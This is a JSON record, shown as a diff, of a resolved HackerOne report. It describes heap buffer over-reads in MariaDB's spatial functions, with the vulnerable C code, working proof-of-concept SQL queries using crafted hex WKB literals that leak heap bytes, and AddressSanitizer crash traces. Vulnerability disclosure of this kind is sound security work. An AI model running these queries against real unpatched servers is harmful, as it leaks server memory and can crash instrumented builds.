@@ -1,0 +1,127 @@
+{
+  "id": 3643157,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjQzMTU3",
+  "url": "https://hackerone.com/reports/3643157",
+  "title": "Spatial functions perform 4-byte heap buffer over-reads on truncated WKB inputs",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-04-01T19:29:01.692Z",
+  "submitted_at": "2026-04-01T19:29:02.966Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "riscj",
+    "url": "/riscj",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/bcd838120b083f3e4634394be4e842b070658eb8ca2ee90ff88b1e7555d99fdf",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/3c93eb467513f5b14156ff4fede2c4636f707fb236b4ad7f308d529c1dd0b660"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-11-22T16:52:23.646Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-10-23T16:52:18.580Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\nMultiple geometry functions perform out-of-bounds reads from heap memory when given \ncrafted WKB input. The functions `num_geometries()` and `num_points()`\nin `sql/spatial.cc` read 4 bytes via `uint4korr(m_data)` without first checking that\n4 bytes are available in the buffer. When the input payload is shorter than 4 bytes,\nthe remaining bytes are read from adjacent heap memory and returned to the client as\npart of the integer result. As such, each invocation can disclose up to 4 bytes of adjacent\nheap memory.\n\nThe root cause is missing `no_data()` bounds checks. The safe version of the same\nfunction (`Gis_geometry_collection::num_geometries()`) correctly performs this check\nand returns an error. The affected functions skip it.\n\nThe input validation gateway `Geometry::construct()` (`sql/spatial.cc:346`) only verifies\nthat total input length >= 9 bytes and the geometry type ID is valid. It does not perform\nstructural validation of the payload. This means crafted hex literals in `SELECT`\nstatements bypass all validation and reach the vulnerable functions directly.\n\nThe MDEV-38372 fix added `is_binary_valid()` checking to `Field_geom::store()`\n(the INSERT-into-column path), but this doesn't protect the direct-expression path\nthrough geometry functions like `SELECT ST_NumGeometries(x'...')`.\n\n## Environment\n\n- MariaDB 12.2.2-MariaDB-deb12,\n- MariaDB 12.2.2-MariaDB-asan-debug\n- Debian 12 (Bookworm), x86_64\n- Default installation, InnoDB, no special configuration\n\n## Affected Code\n\n**1. `Gis_multi_line_string::num_geometries()` - `sql/spatial.cc:3372`**\n\n```c\nint Gis_multi_line_string::num_geometries(uint32 *num) const\n{\n  *num= uint4korr(m_data);  // reads 4 bytes, no bounds check\n  return 0;\n}\n```\n\nThe same bug exists in `Gis_multi_point::num_geometries()` and\n`Gis_multi_polygon::num_geometries()`.\n\nCompare with the safe version, `Gis_geometry_collection::num_geometries()`:\n\n```c\nint Gis_geometry_collection::num_geometries(uint32 *num) const\n{\n  if (no_data(m_data, 4))   // bounds check present\n    return 1;\n  *num= uint4korr(m_data);\n  return 0;\n}\n```\n\n**2. `Gis_line_string::num_points()` - `sql/spatial.cc:1695`**\n\n```c\nint Gis_line_string::num_points(uint32 *n_points) const\n{\n  *n_points= uint4korr(m_data);  // reads 4 bytes, no bounds check\n  return 0;\n}\n```\n\n**3. `Geometry::construct()` - `sql/spatial.cc:346` (no structural validation)**\n\n```c\nGeometry *Geometry::construct(Geometry_buffer *buffer,\n                              const char *data, uint32 data_len)\n{\n  uint32 geom_type;\n  Geometry *result;\n\n  if (data_len < SRID_SIZE + WKB_HEADER_SIZE)   // only checks >= 9 bytes\n    return NULL;\n  geom_type= uint4korr(data + SRID_SIZE + 1);\n  if (!(result= create_by_typeid(buffer, (int) geom_type)))\n    return NULL;\n  result->m_data= data+ SRID_SIZE + WKB_HEADER_SIZE;\n  result->m_data_end= data + data_len;\n  return result;  // no structural validation of payload\n}\n```\n\n## Proof of Concept\n\n### PoC 1: Heap leak via ST_NumGeometries (MULTILINESTRING, 0 payload bytes)\n\n```sql\nSELECT ST_NumGeometries(x'000000000105000000');\n```\n\nInput is exactly 9 bytes: 4 (SRID) + 5 (WKB header). After `construct()` strips\nthe header, `m_data` points to the end of the allocation with 0 bytes of payload.\n`num_geometries()` reads 4 bytes past the allocation boundary.\n\n**Result on normal build**: Returns `16777216` (or similar non-zero integer, the value\nis heap memory content, not derived from input).\n\n**Result on ASAN build**: Server crashes with:\n\n```\n==9711==ERROR: AddressSanitizer: use-after-poison on address 0x619000080979 at pc 0x55cf9e7ca160 bp 0x7f1861a8e170 sp 0x7f1861a8e168\nREAD of size 4 at 0x619000080979 thread T12\n    #0 0x55cf9e7ca15f in Gis_multi_line_string::num_geometries(unsigned int*) const /root/server/sql/spatial.cc:3372\n    #1 0x55cf9e4b0553 in Item_func_numgeometries::val_int() /root/server/sql/item_geofunc.cc:2419\n    #2 0x55cf9e04308b in Type_handler::Item_send_long(Item*, Protocol*, st_value*) const /root/server/sql/sql_type.cc:7637\n    #3 0x55cf9e05f8c3 in Type_handler_long::Item_send(Item*, Protocol*, st_value*) const /root/server/sql/sql_type.h:5893\n    #4 0x55cf9d4f13cd in Item::send(Protocol*, st_value*) /root/server/sql/item.h:1231\n    #5 0x55cf9d5ca718 in Protocol::send_result_set_row(List<Item>*) /root/server/sql/protocol.cc:1359\n    #6 0x55cf9d784071 in select_send::send_data(List<Item>&) /root/server/sql/sql_class.cc:3383\n    #7 0x55cf9d78350d in select_result_sink::send_data_with_check(List<Item>&, st_select_lex_unit*, unsigned long long) /root/server/sql/sql_class.cc:3281\n    #8 0x55cf9da0c3b9 in JOIN::exec_inner() /root/server/sql/sql_select.cc:5001\n    #9 0x55cf9da0b077 in JOIN::exec() /root/server/sql/sql_select.cc:4918\n    #10 0x55cf9da0f577 in mysql_select(THD*, TABLE_LIST*, List<Item>&, Item*, unsigned int, st_order*, st_order*, Item*, st_order*, unsigned long long, select_result*, st_select_lex_unit*, st_select_lex*) /root/server/sql/sql_select.cc:5444\n    #11 0x55cf9d9dcde2 in handle_select(THD*, LEX*, select_result*, unsigned long long) /root/server/sql/sql_select.cc:636\n    #12 0x55cf9d8fc1db in execute_sqlcom_select /root/server/sql/sql_parse.cc:6203\n    #13 0x55cf9d8ebe23 in mysql_execute_command(THD*, bool) /root/server/sql/sql_parse.cc:3985\n    #14 0x55cf9d906cde in mysql_parse(THD*, char*, unsigned int, Parser_state*) /root/server/sql/sql_parse.cc:7925\n    #15 0x55cf9d8dd854 in dispatch_command(enum_server_command, THD*, char*, unsigned int, bool) /root/server/sql/sql_parse.cc:1896\n    #16 0x55cf9d8da555 in do_command(THD*, bool) /root/server/sql/sql_parse.cc:1432\n    #17 0x55cf9dde68ac in do_handle_one_connection(CONNECT*, bool) /root/server/sql/sql_connect.cc:1503\n    #18 0x55cf9dde640b in handle_one_connection /root/server/sql/sql_connect.cc:1415\n    #19 0x55cf9eb5b01b in pfs_spawn_thread /root/server/storage/perfschema/pfs.cc:2198\n    #20 0x7f1887aa71f4 in start_thread nptl/pthread_create.c:442\n    #21 0x7f1887b278db in clone3 ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81\n\n0x619000080979 is located 505 bytes inside of 1016-byte region [0x619000080780,0x619000080b78)\nallocated by thread T12 here:\n    #0 0x7f18884b89cf in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:69\n    #1 0x55cf9f95d1ef in my_malloc /root/server/mysys/my_malloc.c:93\n    #2 0x55cf9f92eec9 in root_alloc /root/server/mysys/my_alloc.c:66\n    #3 0x55cf9f930894 in alloc_root /root/server/mysys/my_alloc.c:336\n    #4 0x55cf9f932d21 in memdup_root /root/server/mysys/my_alloc.c:690\n    #5 0x55cf9d59cba9 in Query_arena::memdup(void const*, unsigned long) const /root/server/sql/sql_class.h:1368\n    #6 0x55cf9d6cf20f in send_server_handshake_packet /root/server/sql/sql_acl.cc:13844\n    #7 0x55cf9d6d5958 in server_mpvio_write_packet /root/server/sql/sql_acl.cc:14711\n    #8 0x55cf9d6db4a4 in native_password_authenticate /root/server/sql/sql_acl.cc:15396\n    #9 0x55cf9d6d7be0 in do_auth_once /root/server/sql/sql_acl.cc:14986\n    #10 0x55cf9d6d8b41 in acl_authenticate(THD*, unsigned int) /root/server/sql/sql_acl.cc:15115\n    #11 0x55cf9dde51bd in check_connection /root/server/sql/sql_connect.cc:1175\n    #12 0x55cf9dde54f1 in login_connection /root/server/sql/sql_connect.cc:1241\n    #13 0x55cf9dde6471 in thd_prepare_connection(THD*) /root/server/sql/sql_connect.cc:1429\n    #14 0x55cf9dde6870 in do_handle_one_connection(CONNECT*, bool) /root/server/sql/sql_connect.cc:1493\n    #15 0x55cf9dde640b in handle_one_connection /root/server/sql/sql_connect.cc:1415\n    #16 0x55cf9eb5b01b in pfs_spawn_thread /root/server/storage/perfschema/pfs.cc:2198\n    #17 0x7f1887aa71f4 in start_thread nptl/pthread_create.c:442\n\nThread T12 created by T0 here:\n    #0 0x7f1888449726 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:207\n    #1 0x55cf9eb56dbd in my_thread_create /root/server/storage/perfschema/my_thread.h:38\n    #2 0x55cf9eb5b40a in pfs_spawn_thread_v1 /root/server/storage/perfschema/pfs.cc:2249\n    #3 0x55cf9d4c4cb0 in inline_mysql_thread_create /root/server/include/mysql/psi/mysql_thread.h:1139\n    #4 0x55cf9d4ddbee in create_thread_to_handle_connection(CONNECT*) /root/server/sql/mysqld.cc:6280\n    #5 0x55cf9d4de213 in create_new_thread(CONNECT*) /root/server/sql/mysqld.cc:6342\n    #6 0x55cf9d4de4fe in handle_accepted_socket(st_mysql_socket, st_mysql_socket) /root/server/sql/mysqld.cc:6404\n    #7 0x55cf9d4df19a in handle_connections_sockets() /root/server/sql/mysqld.cc:6516\n    #8 0x55cf9d4dbd74 in run_main_loop /root/server/sql/mysqld.cc:5758\n    #9 0x55cf9d4dd4a9 in mysqld_main(int, char**) /root/server/sql/mysqld.cc:6181\n    #10 0x55cf9d4c3f78 in main /root/server/sql/main.cc:34\n    #11 0x7f1887a45249 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58\n\nSUMMARY: AddressSanitizer: use-after-poison /root/server/sql/spatial.cc:3372 in Gis_multi_line_string::num_geometries(unsigned int*) const\nShadow bytes around the buggy address:\n  0x0c32800080d0: 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c32800080e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c32800080f0: 00 00 00 00 00 00 f7 00 00 05 f7 01 f7 00 00 00\n  0x0c3280008100: 00 00 00 00 00 00 00 00 00 00 00 00 00 01 f7 00\n  0x0c3280008110: 00 00 00 00 07 f7 00 00 f7 00 00 03 f7 00 00 00\n=>0x0c3280008120: 00 00 00 00 00 00 00 00 00 00 00 00 00 f7 00[02]\n  0x0c3280008130: f7 00 00 00 00 00 00 00 00 f7 00 00 00 f7 00 00\n  0x0c3280008140: f7 00 00 00 00 00 00 01 f7 00 00 00 00 00 00 00\n  0x0c3280008150: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c3280008160: 00 00 00 00 f7 00 00 f7 00 00 f7 00 00 f7 f7 fa\n  0x0c3280008170: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==9711==ABORTING\n```\n\n### PoC 2: Partial payload confirms heap bytes in returned value\n\n```sql\nSELECT ST_NumGeometries(x'0000000001050000004142');\n```\n\n2 payload bytes (`0x41 0x42` = \"AB\"). `num_geometries()` reads 4 bytes starting at\n`m_data`: the first 2 are our input, the remaining 2 are read from past the allocation\nboundary.\n\n**Result on normal build**: Returns `805323329`, which decodes (little-endian) to bytes\n`41 42 00 30`, our `AB` plus 2 bytes from adjacent heap memory (`0x00 0x30`).\nThis value is consistent across repeated runs.\n\n**ASAN build**: Same crash as PoC 1, same stack trace.\n\n### PoC 3: Heap leak via ST_NumPoints (LINESTRING, 0 payload bytes)\n\n```sql\nSELECT ST_NumPoints(x'000000000102000000');\n```\n\nDifferent geometry type (LINESTRING, type 2), different vulnerable function\n(`num_points()` instead of `num_geometries()`).\n\n**Result on normal build**: Returns `761498880` (heap memory content).\n\n**Result on ASAN build**:\n\n```\n==10061==ERROR: AddressSanitizer: use-after-poison on address 0x619000080971 at pc 0x563d1fd99226 bp 0x7fa77c506170 sp 0x7fa77c506168\nREAD of size 4 at 0x619000080971 thread T12\n    #0 0x563d1fd99225 in Gis_line_string::num_points(unsigned int*) const /root/server/sql/spatial.cc:1695\n    #1 0x563d1fa8aa15 in Item_func_numpoints::val_int() /root/server/sql/item_geofunc.cc:2436\n    #2 0x563d1f61d08b in Type_handler::Item_send_long(Item*, Protocol*, st_value*) const /root/server/sql/sql_type.cc:7637\n    #3 0x563d1f6398c3 in Type_handler_long::Item_send(Item*, Protocol*, st_value*) const /root/server/sql/sql_type.h:5893\n    #4 0x563d1eacb3cd in Item::send(Protocol*, st_value*) /root/server/sql/item.h:1231\n    #5 0x563d1eba4718 in Protocol::send_result_set_row(List<Item>*) /root/server/sql/protocol.cc:1359\n    #6 0x563d1ed5e071 in select_send::send_data(List<Item>&) /root/server/sql/sql_class.cc:3383\n    #7 0x563d1ed5d50d in select_result_sink::send_data_with_check(List<Item>&, st_select_lex_unit*, unsigned long long) /root/server/sql/sql_class.cc:3281\n    #8 0x563d1efe63b9 in JOIN::exec_inner() /root/server/sql/sql_select.cc:5001\n    #9 0x563d1efe5077 in JOIN::exec() /root/server/sql/sql_select.cc:4918\n    #10 0x563d1efe9577 in mysql_select(THD*, TABLE_LIST*, List<Item>&, Item*, unsigned int, st_order*, st_order*, Item*, st_order*, unsigned long long, select_result*, st_select_lex_unit*, st_select_lex*) /root/server/sql/sql_select.cc:5444\n    #11 0x563d1efb6de2 in handle_select(THD*, LEX*, select_result*, unsigned long long) /root/server/sql/sql_select.cc:636\n    #12 0x563d1eed61db in execute_sqlcom_select /root/server/sql/sql_parse.cc:6203\n    #13 0x563d1eec5e23 in mysql_execute_command(THD*, bool) /root/server/sql/sql_parse.cc:3985\n    #14 0x563d1eee0cde in mysql_parse(THD*, char*, unsigned int, Parser_state*) /root/server/sql/sql_parse.cc:7925\n    #15 0x563d1eeb7854 in dispatch_command(enum_server_command, THD*, char*, unsigned int, bool) /root/server/sql/sql_parse.cc:1896\n    #16 0x563d1eeb4555 in do_command(THD*, bool) /root/server/sql/sql_parse.cc:1432\n    #17 0x563d1f3c08ac in do_handle_one_connection(CONNECT*, bool) /root/server/sql/sql_connect.cc:1503\n    #18 0x563d1f3c040b in handle_one_connection /root/server/sql/sql_connect.cc:1415\n    #19 0x563d2013501b in pfs_spawn_thread /root/server/storage/perfschema/pfs.cc:2198\n    #20 0x7fa7a26a71f4 in start_thread nptl/pthread_create.c:442\n    #21 0x7fa7a27278db in clone3 ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81\n\n0x619000080971 is located 497 bytes inside of 1016-byte region [0x619000080780,0x619000080b78)\nallocated by thread T12 here:\n    #0 0x7fa7a30b89cf in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:69\n    #1 0x563d20f371ef in my_malloc /root/server/mysys/my_malloc.c:93\n    #2 0x563d20f08ec9 in root_alloc /root/server/mysys/my_alloc.c:66\n    #3 0x563d20f0a894 in alloc_root /root/server/mysys/my_alloc.c:336\n    #4 0x563d20f0cd21 in memdup_root /root/server/mysys/my_alloc.c:690\n    #5 0x563d1eb76ba9 in Query_arena::memdup(void const*, unsigned long) const /root/server/sql/sql_class.h:1368\n    #6 0x563d1eca920f in send_server_handshake_packet /root/server/sql/sql_acl.cc:13844\n    #7 0x563d1ecaf958 in server_mpvio_write_packet /root/server/sql/sql_acl.cc:14711\n    #8 0x563d1ecb54a4 in native_password_authenticate /root/server/sql/sql_acl.cc:15396\n    #9 0x563d1ecb1be0 in do_auth_once /root/server/sql/sql_acl.cc:14986\n    #10 0x563d1ecb2b41 in acl_authenticate(THD*, unsigned int) /root/server/sql/sql_acl.cc:15115\n    #11 0x563d1f3bf1bd in check_connection /root/server/sql/sql_connect.cc:1175\n    #12 0x563d1f3bf4f1 in login_connection /root/server/sql/sql_connect.cc:1241\n    #13 0x563d1f3c0471 in thd_prepare_connection(THD*) /root/server/sql/sql_connect.cc:1429\n    #14 0x563d1f3c0870 in do_handle_one_connection(CONNECT*, bool) /root/server/sql/sql_connect.cc:1493\n    #15 0x563d1f3c040b in handle_one_connection /root/server/sql/sql_connect.cc:1415\n    #16 0x563d2013501b in pfs_spawn_thread /root/server/storage/perfschema/pfs.cc:2198\n    #17 0x7fa7a26a71f4 in start_thread nptl/pthread_create.c:442\n\nThread T12 created by T0 here:\n    #0 0x7fa7a3049726 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:207\n    #1 0x563d20130dbd in my_thread_create /root/server/storage/perfschema/my_thread.h:38\n    #2 0x563d2013540a in pfs_spawn_thread_v1 /root/server/storage/perfschema/pfs.cc:2249\n    #3 0x563d1ea9ecb0 in inline_mysql_thread_create /root/server/include/mysql/psi/mysql_thread.h:1139\n    #4 0x563d1eab7bee in create_thread_to_handle_connection(CONNECT*) /root/server/sql/mysqld.cc:6280\n    #5 0x563d1eab8213 in create_new_thread(CONNECT*) /root/server/sql/mysqld.cc:6342\n    #6 0x563d1eab84fe in handle_accepted_socket(st_mysql_socket, st_mysql_socket) /root/server/sql/mysqld.cc:6404\n    #7 0x563d1eab919a in handle_connections_sockets() /root/server/sql/mysqld.cc:6516\n    #8 0x563d1eab5d74 in run_main_loop /root/server/sql/mysqld.cc:5758\n    #9 0x563d1eab74a9 in mysqld_main(int, char**) /root/server/sql/mysqld.cc:6181\n    #10 0x563d1ea9df78 in main /root/server/sql/main.cc:34\n    #11 0x7fa7a2645249 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58\n\nSUMMARY: AddressSanitizer: use-after-poison /root/server/sql/spatial.cc:1695 in Gis_line_string::num_points(unsigned int*) const\nShadow bytes around the buggy address:\n  0x0c32800080d0: 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c32800080e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c32800080f0: 00 00 00 00 00 00 f7 00 00 05 f7 01 f7 00 00 00\n  0x0c3280008100: 00 00 00 00 00 00 00 00 00 00 00 00 05 f7 00 00\n  0x0c3280008110: 00 00 00 03 f7 00 00 f7 00 00 03 f7 00 00 00 00\n=>0x0c3280008120: 00 00 00 00 00 00 00 00 00 00 00 00 f7 00[02]f7\n  0x0c3280008130: 00 00 00 00 00 00 00 00 f7 00 00 00 f7 00 00 f7\n  0x0c3280008140: 00 00 00 00 05 f7 00 00 00 00 00 00 00 00 00 00\n  0x0c3280008150: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c3280008160: 00 f7 00 00 f7 00 00 f7 00 00 f7 00 00 f7 f7 fa\n  0x0c3280008170: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==10061==ABORTING\n```\n\n### Control: GEOMETRYCOLLECTION returns NULL (has bounds check)\n\n```sql\nSELECT ST_NumGeometries(x'000000000107000000');\n```\n\n**Result**: `NULL`\n\n`Gis_geometry_collection::num_geometries()` correctly calls\n`no_data(m_data, 4)`, detects insufficient data, and returns an error. This confirms\nthe fix is simply adding the same bounds check to the affected functions.\n\n### Additional affected geometry types (same bug, same result)\n\n```sql\n-- MULTIPOINT (type 4), same leak\nSELECT ST_NumGeometries(x'000000000104000000');\n\n-- MULTIPOLYGON (type 6), same leak\nSELECT ST_NumGeometries(x'000000000106000000');\n```\n\nBoth return the same leaked value as MULTILINESTRING, confirming that\n`Gis_multi_point::num_geometries()` and `Gis_multi_polygon::num_geometries()`\nhave the same missing bounds check.\n\n## Impact\n\n## Heap Information Disclosure\n\nThe leaked 4 bytes come from heap memory adjacent to the input allocation. On a\nnon-ASAN production build, the leaked data is returned to the client as an\ninteger value. The contents of the leaked bytes depend on heap layout and what the \nallocator placed adjacent to the input buffer.\n\n## Denial of Service (ASAN/debug builds)\n\nOn ASAN-instrumented builds, these queries crash the server immediately due to invalid\nmemory access.\n\n## No Special Privileges Required\n\nThe vulnerability is triggered by a `SELECT` with a hex literal. No special table or\ndatabase privileges are required. Any authenticated user with permission to execute `SELECT`\nstatements can reach the vulnerable path.\n\n## Affected Versions\n\nConfirmed on 12.2.2. Source inspection of 10.6.25 shows the same vulnerable implementations\nwithout bounds checks. As such, the issue likely affects all currently-maintained MariaDB versions.",
+  "weakness": {
+    "id": 9,
+    "name": "Buffer Over-read"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-11-22T16:52:20.871Z",
+  "allow_singular_disclosure_after": -12059.16434114,
+  "singular_disclosure_allowed": true,
+  "vote_count": 1,
+  "voters": [
+    "2026"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.7,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 10336,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "MariaDB Server & Connectors - Data corruption, exfiltration, disclosure",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": [],
+    "can_view_ave_report?": false
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
